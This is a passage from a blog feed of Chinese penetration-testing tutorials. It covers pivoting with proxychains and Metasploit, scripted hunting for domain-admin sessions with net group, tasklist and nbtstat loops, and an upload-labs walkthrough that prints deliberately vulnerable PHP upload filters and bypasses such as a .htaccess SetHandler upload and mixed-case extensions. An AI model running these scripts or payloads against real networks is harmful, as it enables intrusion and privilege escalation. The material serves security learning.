alt="在这里插入图片描述"></li></ul><p>接下来用kali上的神奇proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503223622621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试是否能连内网的机器<br><img src="https://img-blog.csdnimg.cn/20210503223722102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以成功连接<br>通过代理工具开启msf<br><img src="https://img-blog.csdnimg.cn/20210503223753299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就可以直接搞内网了。实战中可能有多层网段。就需要挂多层代理</p><p>msf中有很多  攻击载荷模块，嗅探模块和后渗透模块。大家后期可以深入的去研究研究。</p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找域管理员进程</title>
    <link href="/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/"/>
    <url>/2022/06/15/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E8%BF%9B%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，一个典型的域权限提升过程，通常围绕着收集明文凭据或通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据。如果内网环境非常复杂，渗透测试人员无法立即在拥有权限的系统中获得域管理员进程，那么通常采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到渗透测试的路径。</p><p>现在我们来假设一种情况：渗透测试人员在某个内网环境中获得一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，知道哪些用户登录了这台服务器。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时没有域管理员组中的用户登录这台服务器，就可以使用另一个账户并寻找账户在内网的哪台机器上具有管理权限，再枚举这台机器上的用户，然后继续进行渗透测试，直至找到一个可以获取域管理员权限的有效路径为止。</p><p><strong>1.1本机检查</strong></p><ul><li>获取域管理员列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502214002895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist  /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502214113270.png" alt="在这里插入图片描述"><br>列入箭头所指如果为管理员那就可做令牌劫持拿到管理员权限</p><p><strong>1.2 查询域控制器的域用户会话</strong><br>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><ul><li>查询域控制器列表</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain<br></code></pre></td></tr></table></figure><ul><li>收集域管理员列表<br><img src="https://img-blog.csdnimg.cn/20210502221209320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210502221303765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>收集所有活动域的会话列表</li></ul><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe是一个很棒的工具，它包含本地windows函数netsessionenum。<br><img src="https://img-blog.csdnimg.cn/20210502221924800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有会话才有信息，否则就没有</p><ul><li>交叉引用域管理员列表与活动会话列表</li></ul><p>对域管理员列表和活动会话列表进行交叉引用，可以确定那些IP地址有活动域令牌。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net localgroup <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br>net localgroup <span class="hljs-string">&quot;Domian Admins&quot;</span> /domain &gt; admins.txt<br></code></pre></td></tr></table></figure><p>然后运行一下脚本，会在当前目录下生成一个文本文件sessions.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; FOR /F %a <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> sessions.txt | @findstr /I %a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503232022719.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503231928181.png" alt="在这里插入图片描述"><br>这里因为没有会话所以没有内容。</p><p><strong>2.1 查询远程系统中运行的任务</strong><br>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务。<br>首先，从Domain Admins组中收集域管理员列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">FOR /F %i <span class="hljs-keyword">in</span> (dcs.txt) DO @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a process on %i &amp;&amp; pause<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503234751155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>2.2 扫描远程系统的NetBIOS信息</strong><br>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain &gt; admins.txt<br>net group <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain &gt; dcs.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503235329179.png" alt="在这里插入图片描述"><br>使用nbtscan工具，就文件与nbtscan工具置于同一目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n <span class="hljs-keyword">in</span> (admins.txt) DO @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503235629887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考：<a href="https://blog.csdn.net/weixin_45007073/article/details/114498146">https://blog.csdn.net/weixin_45007073/article/details/114498146</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域管理员信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上次靶场练习</title>
    <link href="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>注意：这里的环境要为php5.6以下没有nts的<br><img src="https://img-blog.csdnimg.cn/20210614175336438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-01</strong><br>直接上传图片码抓包修改后缀即可<br><img src="https://img-blog.csdnimg.cn/20210614175110872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210614175159921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-02</strong><br>同样上传图片码抓包修改后缀即可，比Pass-01多了个对MIME的检测，但对于上传图片码来说就没啥区别<br><strong>Pass-03</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210614175916801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>后台进行了黑名单限制，但是黑名单不完整，常见的可执行PHP文件的后缀：<br>php2、php3、php5、phtml、pht  当然这个的是配置文件里有才行</p><p><img src="https://img-blog.csdnimg.cn/20210614214736802.png" alt="在这里插入图片描述"></p><p><strong>Pass-04</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); //转换为小写<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //收尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到这个黑名单黑的很死，但是却漏了htaccess,我们可以上传一个.htaccess的配置文件，从而绕过<br><img src="https://img-blog.csdnimg.cn/20210614215832487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SetHandler application/x-httpd-php<br><span class="hljs-comment">#就是让所有的文件都当作php文件解析</span><br></code></pre></td></tr></table></figure><p>此时我们在上传一个图片码就行了<br><img src="https://img-blog.csdnimg.cn/20210614220044510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>Pass-05</strong><br>看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);//删除文件名末尾的点<br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);//去除字符串::<span class="hljs-variable">$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); //首尾去空<br><br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(1000,9999).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看出常规的后缀名都禁了，但是可以大小写混写绕过，当然这个目标运行环境得为windows<br><img src="https://img-blog.csdnimg.cn/20210614223221462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2021061422323817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Pass-06</strong><br>查看源码，将所有后缀转为小写在比对，所有大小写混写是行不通了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span 